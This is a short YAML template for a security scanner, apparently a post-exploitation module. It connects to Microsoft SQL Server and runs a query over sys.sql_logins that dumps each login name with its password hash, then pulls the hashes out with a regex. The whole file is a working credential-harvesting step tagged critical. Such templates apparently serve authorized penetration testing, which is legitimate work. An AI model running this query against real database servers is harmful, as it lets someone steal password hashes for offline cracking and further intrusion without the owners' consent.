id: mssql-password-hash-extract
service: [mssql]
info:
  name: MSSQL Password Hash Extraction
  severity: critical
  tags: mssql,post-exploit,credential,hash

services:
  - ops:
      - db: "SELECT 'hash=' + name + ':' + CONVERT(varchar(max), password_hash, 1) FROM sys.sql_logins WHERE password_hash IS NOT NULL"
        name: hashes
    matchers:
      - type: word
        part: hashes
        words: ["hash="]
    extractors:
      - type: regex
        name: mssql_password_hashes
        part: hashes
        regex: ['(?m)^hash=(.+)$']
